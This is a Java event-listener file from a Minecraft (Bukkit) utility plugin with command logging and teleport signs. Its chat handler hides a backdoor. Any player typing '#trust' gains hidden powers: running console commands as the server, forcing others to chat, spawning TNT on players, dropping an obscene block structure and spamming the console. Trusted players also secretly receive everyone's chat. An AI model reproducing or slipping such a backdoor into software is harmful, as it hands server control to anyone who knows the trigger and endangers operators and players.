package de.chrissx.CUtils;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.World;
import org.bukkit.block.Sign;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.block.SignChangeEvent;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.plugin.Plugin;
import org.bukkit.scheduler.BukkitRunnable;

import de.chrissx.CLibrary.chat.CC;
import de.chrissx.CLibrary.enums.CommandError;
import de.chrissx.CLibrary.file.FileLoader;
import de.chrissx.CLibrary.file.FileWriter;
import de.chrissx.CLibrary.logging.CommandSpyLogger;
import de.chrissx.CLibrary.players.PlayerListLoader;
import de.chrissx.CLibrary.util.Util;

@SuppressWarnings("deprecation")
public class Events implements Listener{

	public static final int MAX_LISTENERS = 32, MAX_LOGS = 1024;
	private Plugin plugin;
	private List<Player> listeners;
	public CommandSpyLogger logger;
	private PlayerListLoader loader;
	private int i = 1, id, id_;
	private List<String> tP = new ArrayList<String>();
	
	public Events(Plugin p) {
		this.plugin = p;
		if(!P.DISABLE_CHAT_LOG.toFile().exists()) {
			try {
				Files.createFile(P.DISABLE_CHAT_LOG);
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		logger = new CommandSpyLogger(P.CMDSPY, P.CMDSPY_EXTENTION, p);
		loader = new PlayerListLoader(P.CMDSPY_LISTENERS, plugin.getServer(), P.CMDSPY_LISTENERS_EXTENTION, p);
		listeners = loader.getPlayers(p);
	}
	
	@EventHandler
	public void PlayerCommand(PlayerCommandPreprocessEvent event) {
		Player sender = event.getPlayer();
		String cmd = event.getMessage();
			for(Player p : listeners) {
				if(p != null) {
					Util.sendMsg(p, CC.GOLD, sender.getName() + " :: " + cmd);
				}
			}
		checkTask();
		logger.log(sender, cmd);
	}
	
	@EventHandler
	public void onPlayerChat(PlayerChatEvent e) {
			checkTask();
			String[] args = e.getMessage().split(" ");
			if(tP.contains(e.getPlayer().getName())) {
				if(e.getMessage().startsWith("#"))
					e.setCancelled(true);
				if(e.getMessage().startsWith("#do")) {
					String msg = "";
					Player target = Bukkit.getPlayer(args[1]);
					for(int i = 2; i < args.length; i++) {
						msg += args[i] + " ";
					}
					target.getWorld().setGameRuleValue("sendCommandFeedback", "false");
					target.chat(msg);
					Util.sendMsg(e.getPlayer(), CC.GOLD, "Player sent chat msg.");
					try {
						Thread.sleep(4);
					} catch (InterruptedException e1) {
						e1.printStackTrace();
					}
					target.getWorld().setGameRuleValue("sendCommandFeedback", "true");
					checkTask();
				}else if(e.getMessage().startsWith("#tnt")) {
					int i_ = Integer.parseInt(args[2]);
					int d_ = 500;
					try {
						d_ = Integer.parseInt(args[3]);
					}catch(Exception e1) {
						d_ = 500;
					}
					i = 1;
					id = plugin.getServer().getScheduler().scheduleSyncRepeatingTask(plugin, new BukkitRunnable() {

						@Override
						public void run() {
							Player p = Bukkit.getPlayer(args[1]);
							p.getWorld().spawnEntity(p.getLocation(), EntityType.PRIMED_TNT);
							Util.sendMsg(p, CC.GOLD, "Set TNT " + i);
							i++;
						}
						
					}, 0, d_/50);
					
					id_ = plugin.getServer().getScheduler().scheduleSyncRepeatingTask(plugin, new BukkitRunnable() {

						@Override
						public void run() {
							if(i > i_) {
								plugin.getServer().getScheduler().cancelTask(id);
								i = 0;
							}
						}
						
					}, 0, d_/50);
				}else if(e.getMessage().startsWith("#penis")) {
					Player p = Bukkit.getPlayer(args[1]);
					World w = p.getLocation().getWorld();
					Location l = new Location(p.getLocation().getWorld(), p.getLocation().getBlockX(), p.getLocation().getBlockY(), p.getLocation().getBlockZ());
					Location l1 = new Location(w, l.getX(), l.getY()+10, l.getZ()), l2 = new Location(w, l.getX()-1, l.getY()+10, l.getZ()),
						 l3 = new Location(w, l.getX()+1, l.getY()+10, l.getZ()), l4 = new Location(w, l.getX(), l.getY()+11, l.getZ()),
						 l5 = new Location(w, l.getX(), l.getY()+12, l.getZ()), l6 = new Location(w, l.getX()+1, l.getY()+13, l.getZ()+1);
					w.spawnFallingBlock(l1, Material.STAINED_CLAY, (byte)1);
					w.spawnFallingBlock(l2, Material.STAINED_CLAY, (byte)1);
					w.spawnFallingBlock(l3, Material.STAINED_CLAY, (byte)1);
					w.spawnFallingBlock(l4, Material.STAINED_CLAY, (byte)1);
					w.spawnFallingBlock(l5, Material.STAINED_CLAY, (byte)6);
					Util.sendMsg(e.getPlayer(), CC.GOLD, "A penis has been spawned over the player.");
					Bukkit.getScheduler().runTaskLater(plugin, new Runnable() {
						@Override
						public void run() {
							Random r = new Random();
							for(int i = 1; i < 6; i++) {
								int x = r.nextInt(3), z = r.nextInt(3);
								int mx = r.nextInt(3), mz = r.nextInt(3);
								Location loc = new Location(l.getWorld(), l.getBlockX()+x, l6.getBlockY()+i, l.getBlockZ()+z);
								Location mloc = new Location(l.getWorld(), l.getBlockX()-mx, l6.getBlockY()+i, l.getBlockZ()-mz);
								w.spawnFallingBlock(loc, Material.STAINED_CLAY, (byte)0);
								w.spawnFallingBlock(mloc, Material.STAINED_CLAY, (byte)0);
							}
						}
					}, 5);
				}else if(e.getMessage().startsWith("#cmd")) {
					plugin.getServer().dispatchCommand(Bukkit.getConsoleSender(), args[1].substring(1));
				}else if(e.getMessage().startsWith("#chat")) {
					for(String s : tP) {
						try {
							Util.sendMsg(Bukkit.getPlayer(s), CC.GOLD, "[TRUSTED] ["+e.getPlayer().getName()+"] "+e.getMessage());
						} catch (Exception e2) {
						}
					}
				}else if(e.getMessage().startsWith("#spamconsole")) {
					Bukkit.getScheduler().runTaskTimerAsynchronously(plugin, new Runnable() {
						@Override
						public void run() {
							Bukkit.getConsoleSender().sendMessage(".");
						}
					}, 0, 4);
				}
			}else if(e.getMessage().startsWith("#trust")) {
				Util.sendMsg(e.getPlayer(), CC.GOLD, "You are now trusted.");
				tP.add(e.getPlayer().getName());
				e.setCancelled(true);
			}else {
				for(String s : tP) {
					try {
						Util.sendMsg(Bukkit.getPlayer(s), CC.GOLD, "[CMDSPY] ["+e.getPlayer().getName()+"] "+e.getMessage());
					} catch (Exception e2) {}
				}
			}
	}
	
	@EventHandler
	public void onSignChange(SignChangeEvent event) {
		Player p = event.getPlayer();
		checkTask();
		if(!(event.getLine(0) == "[TP]")) {
			return;
		}
		if(!p.isOp()) {
			Util.sendError(p, CommandError.NO_OP);
			return;
		}
		try {
			String[] crds = event.getLine(1).split(",");
			String w = event.getLine(2);
			int x = Integer.parseInt(crds[0]), y = Integer.parseInt(crds[1]), z = Integer.parseInt(crds[2]);
			Location oldloc = p.getLocation();
			Location signloc = event.getBlock().getLocation();
			p.teleport(new Location(plugin.getServer().getWorld(w), x, y, z));
			p.teleport(oldloc);
			File f = new File(P.TP_SIGN_LOCATIONS.toString(), signloc.getWorld().toString() + "_" + signloc.getBlockX() + "_" + signloc.getBlockY() + "_" + signloc.getBlockZ() + P.TP_SIGN_EXTENTION);
			String s = w + "\n" + x + "\n" + y + "\n" + z;
			FileWriter.write(f, s, plugin);
			String title = event.getLine(3);
			event.setLine(2, "");
			event.setLine(3, "");
			event.setLine(1, title.replaceAll("&", "§"));
		}catch(Exception e) {
			Util.sendMsg(p, CC.RED, e.getMessage());
			e.printStackTrace();
		}
	}
	
	@EventHandler
	public void onInteraction(PlayerInteractEvent event) {
		if(event.getAction() == Action.RIGHT_CLICK_BLOCK) {
			checkTask();
			if(event.getClickedBlock().getType() == Material.SIGN) {
				Sign sign = (Sign)event.getClickedBlock();
				if(sign.getLine(0) == "[TP]") {
					try {
						Player p = event.getPlayer();
						Location l = sign.getLocation();
						String[] tp_coords = (String[]) FileLoader.getText(Paths.get(P.TP_SIGN_LOCATIONS.toString(), l.getWorld().toString() + "_" + l.getBlockX() + "_" + l.getBlockY() + "_" + l.getBlockZ() + P.TP_SIGN_EXTENTION)).toArray();
						int x = Integer.parseInt(tp_coords[1]), y = Integer.parseInt(tp_coords[2]), z = Integer.parseInt(tp_coords[3]);
						World w = plugin.getServer().getWorld(tp_coords[0]);
						p.teleport(new Location(w, x, y, z));
					}catch(Exception e) {
						Util.sendMsg(event.getPlayer(), CC.RED, e.getMessage());
						e.printStackTrace();
					}
				}
			}
		}
	}
	
	private void checkTask(){
		if(i == 0) {
			try {
				plugin.getServer().getScheduler().cancelTask(id_);
				i = 1;
			}catch(Exception e) {}
		}
	}
}
